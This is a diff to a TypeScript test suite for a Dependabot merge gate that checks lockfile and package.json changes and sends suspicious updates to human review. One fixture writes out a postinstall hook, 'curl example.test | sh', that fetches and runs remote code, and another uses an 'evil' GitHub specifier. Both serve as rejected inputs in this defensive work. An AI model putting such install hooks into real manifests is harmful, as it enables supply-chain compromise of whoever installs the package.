@@ -6,6 +6,7 @@ import type {
 } from "../../f/factory/lib/dependabot_support.ts";
 import {
   checkLockfileDiff,
+  checkPackageJsonDiff,
   classifyUpdate,
   evaluateGate,
   isPublishedLongEnough,
@@ -41,6 +42,14 @@ describe("classifyUpdate", () => {
   test("treats a minor bump of a 0.x version as major", () => {
     expect(classifyUpdate("0.4.1", "0.5.0")).toBe("major");
   });
+
+  test("treats a patch bump of a 0.0.x version as major", () => {
+    expect(classifyUpdate("0.0.3", "0.0.4")).toBe("major");
+  });
+
+  test("keeps a patch bump of a 0.x version as patch", () => {
+    expect(classifyUpdate("0.4.1", "0.4.2")).toBe("patch");
+  });
 });
 
 describe("isPublishedLongEnough", () => {
@@ -70,6 +79,54 @@ describe("isPublishedLongEnough", () => {
     expect(isPublishedLongEnough(publishedAt, publishedMs - DAY_MS, 0)).toBe(
       false,
     );
+  });
+
+  test("fails for a date without a time zone", () => {
+    expect(
+      isPublishedLongEnough(
+        "2026-10-01T00:00:00",
+        publishedMs + 30 * DAY_MS,
+        7,
+      ),
+    ).toBe(false);
+  });
+
+  test("fails for a date without a time", () => {
+    expect(
+      isPublishedLongEnough("2026-10-01", publishedMs + 30 * DAY_MS, 7),
+    ).toBe(false);
+  });
+
+  test("accepts a date with a numeric offset", () => {
+    expect(
+      isPublishedLongEnough(
+        "2026-10-01T09:00:00+09:00",
+        publishedMs + 7 * DAY_MS,
+        7,
+      ),
+    ).toBe(true);
+  });
+
+  test("fails when minDays is negative", () => {
+    expect(isPublishedLongEnough(publishedAt, publishedMs + DAY_MS, -1)).toBe(
+      false,
+    );
+  });
+
+  test("fails when minDays is not finite", () => {
+    expect(
+      isPublishedLongEnough(publishedAt, publishedMs + DAY_MS, Number.NaN),
+    ).toBe(false);
+  });
+
+  test("fails when minDays is infinite", () => {
+    expect(
+      isPublishedLongEnough(
+        publishedAt,
+        publishedMs + DAY_MS,
+        Number.POSITIVE_INFINITY,
+      ),
+    ).toBe(false);
   });
 });
 
@@ -123,28 +180,71 @@ const BEFORE = lockText({ "left-pad": "1.3.0", other: "2.0.0" }, [
   { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
 ]);
 
+const AFTER_OK = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
+  { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+  { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
+]);
+
 describe("checkLockfileDiff", () => {
   test("accepts a version bump of the target only", () => {
-    const after = lockText({ "left-pad": "1.3.1", other: "2.0.0" }, [
-      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
-      { key: "other", id: "other@2.0.0", integrity: INTEGRITY_B },
-    ]);
-
-    expect(checkLockfileDiff(BEFORE, after, TARGET)).toEqual({ ok: true });
+    expect(checkLockfileDiff(BEFORE, AFTER_OK, TARGET)).toEqual({ ok: true });
   });
 
-  test("accepts a bump of the real console/bun.lock", () => {
+  test("accepts a patch bump of a package in the real console/bun.lock", () => {
     const real = readFileSync(
       new URL("../../console/bun.lock", import.meta.url),
       "utf8",
     );
+    // 最初に見つかる、major 1以上で固定された依存の patch を1つ上げる。
+    const pinned = /^\s+"([^"]+)": "([1-9]\d*)\.(\d+)\.(\d+)",$/m.exec(real);
+    if (pinned === null)
+      throw new Error("no pinned dependency in the lockfile");
+    const [line, name, major, minor, patch] = pinned;
+    const from = `${major}.${minor}.${patch}`;
+    const to = `${major}.${minor}.${Number(patch) + 1}`;
     const after = real
-      .replace('"clsx": "2.1.1"', '"clsx": "2.1.2"')
-      .replace("clsx@2.1.1", "clsx@2.1.2");
+      .replace(line, line.replace(from, to))
+      .replaceAll(`"${name}@${from}"`, `"${name}@${to}"`);
 
-    expect(
-      checkLockfileDiff(real, after, { name: "clsx", to: "2.1.2" }),
-    ).toEqual({ ok: true });
+    expect(checkLockfileDiff(real, after, { name: name ?? "", to })).toEqual({
+      ok: true,
+    });
+  });
+
+  test("rejects a nested copy of the target that jumps a major version", () => {
+    const before = lockText({ "left-pad": "1.3.0" }, [
+      { key: "left-pad", id: "left-pad@1.3.0" },
+      { key: "foo/left-pad", id: "left-pad@0.9.0" },
+    ]);
+    const after = lockText({ "left-pad": "1.3.1" }, [
+      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+      { key: "foo/left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+    ]);
+
+    expect(checkLockfileDiff(before, after, TARGET).ok).toBe(false);
+  });
+
+  test("accepts a nested copy of the target bumped by a patch", () => {
+    const before = lockText({ "left-pad": "1.3.0" }, [
+      { key: "left-pad", id: "left-pad@1.3.0" },
+      { key: "foo/left-pad", id: "left-pad@1.3.0" },
+    ]);
+    const after = lockText({ "left-pad": "1.3.1" }, [
+      { key: "left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+      { key: "foo/left-pad", id: "left-pad@1.3.1", integrity: INTEGRITY_B },
+    ]);
+
+    expect(checkLockfileDiff(before, after, TARGET)).toEqual({ ok: true });
+  });
+
+  test("rejects a duplicate key in the packages table", () => {
+    // 後ろの値が有効になる重複なので、検出しなければ更新に見える。
+    const duplicated = AFTER_OK.replace(
+      '    "left-pad": [',
+      `    "left-pad": ["left-pad@1.3.0", "", {}, "${INTEGRITY_A}"],\n    "left-pad": [`,
+    );
+
+    expect(checkLockfileDiff(BEFORE, duplicated, TARGET).ok).toBe(false);
   });
 
   test("rejects a package added besides the target", () => {
@@ -236,6 +336,176 @@ describe("checkLockfileDiff", () => {
   });
 });
 
+function manifest(extra: Record<string, unknown> = {}): string {
+  return JSON.stringify(
+    {
+      name: "fixture",
+      version: "1.0.0",
+      scripts: { test: "bun test" },
+      dependencies: { "left-pad": "1.3.0", other: "2.0.0" },
+      devDependencies: { tool: "3.0.0" },
+      ...extra,
+    },
+    null,
+    2,
+  );
+}
+
+const MANIFEST_BEFORE = manifest();
+
+describe("checkPackageJsonDiff", () => {
+  test("accepts a version bump of the target dependency", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET)).toEqual({
+      ok: true,
+    });
+  });
+
+  test("accepts a caret range for the new version", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "^1.3.1", other: "2.0.0" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET)).toEqual({
+      ok: true,
+    });
+  });
+
+  test("accepts a bump of the target in devDependencies", () => {
+    const before = manifest({
+      dependencies: { other: "2.0.0" },
+      devDependencies: { "left-pad": "1.3.0" },
+    });
+    const after = manifest({
+      dependencies: { other: "2.0.0" },
+      devDependencies: { "left-pad": "1.3.1" },
+    });
+
+    expect(checkPackageJsonDiff(before, after, TARGET)).toEqual({ ok: true });
+  });
+
+  test("rejects a changed scripts section", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+      scripts: { test: "bun test", postinstall: "curl example.test | sh" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects an added trustedDependencies section", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+      trustedDependencies: ["left-pad"],
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects an added overrides section", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+      overrides: { other: "9.9.9" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects an added resolutions section", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+      resolutions: { other: "9.9.9" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects an added patchedDependencies section", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+      patchedDependencies: { other: "patches/other.patch" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects an added bin section", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+      bin: { fixture: "./run.js" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a changed version of another dependency", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.1" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects an added dependency", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0", extra: "1.0.0" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a removed dependency", () => {
+    const after = manifest({ dependencies: { "left-pad": "1.3.1" } });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a changed top-level field", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "1.3.1", other: "2.0.0" },
+      version: "9.9.9",
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a manifest where the target is unchanged", () => {
+    expect(
+      checkPackageJsonDiff(MANIFEST_BEFORE, MANIFEST_BEFORE, TARGET).ok,
+    ).toBe(false);
+  });
+
+  test("rejects a specifier that does not point at the expected version", () => {
+    const after = manifest({
+      dependencies: { "left-pad": "github:evil/left-pad", other: "2.0.0" },
+    });
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a duplicate key", () => {
+    const duplicated = MANIFEST_BEFORE.replace(
+      '"version": "1.0.0"',
+      '"version": "1.0.0", "version": "1.0.0"',
+    );
+    const after = duplicated.replace(
+      '"left-pad": "1.3.0"',
+      '"left-pad": "1.3.1"',
+    );
+
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, after, TARGET).ok).toBe(false);
+  });
+
+  test("rejects a manifest that cannot be parsed", () => {
+    expect(checkPackageJsonDiff(MANIFEST_BEFORE, "{ nope", TARGET).ok).toBe(
+      false,
+    );
+  });
+});
+
 const NOW_MS = Date.parse("2026-10-20T00:00:00.000Z");
 
 function validInput(overrides: Partial<GateInput> = {}): GateInput {
@@ -253,6 +523,8 @@ function validInput(overrides: Partial<GateInput> = {}): GateInput {
     nowMs: NOW_MS,
     minPublishedDays: 7,
     lockfile: { ok: true },
+    allCommitsByDependabot: true,
+    packageJson: { ok: true },
     hasNewLifecycleScript: false,
     ...overrides,
   };
@@ -423,6 +695,30 @@ describe("evaluateGate", () => {
 
   test("needs a human when a lifecycle script was added", () => {
     expect(verdictOf({ hasNewLifecycleScript: true })).toBe("needs_human");
+  });
+
+  test("needs a human when a commit is not by dependabot", () => {
+    expect(verdictOf({ allCommitsByDependabot: false })).toBe("needs_human");
+  });
+
+  test("needs a human when the package.json diff is rejected", () => {
+    expect(
+      verdictOf({ packageJson: { ok: false, reason: "scripts changed" } }),
+    ).toBe("needs_human");
+  });
+
+  test("needs a human when no check is required", () => {
+    expect(verdictOf({ requiredChecks: [], checks: [] })).toBe("needs_human");
+  });
+
+  test("needs a human when the minimum days is not finite", () => {
+    expect(verdictOf({ minPublishedDays: Number.NaN })).toBe("needs_human");
+  });
+
+  test("needs a human when the publish date has no time zone", () => {
+    expect(verdictOf({ publishedAtIso: "2026-10-01T00:00:00" })).toBe(
+      "needs_human",
+    );
   });
 
   test("needs a human when the publish date is invalid", () => {
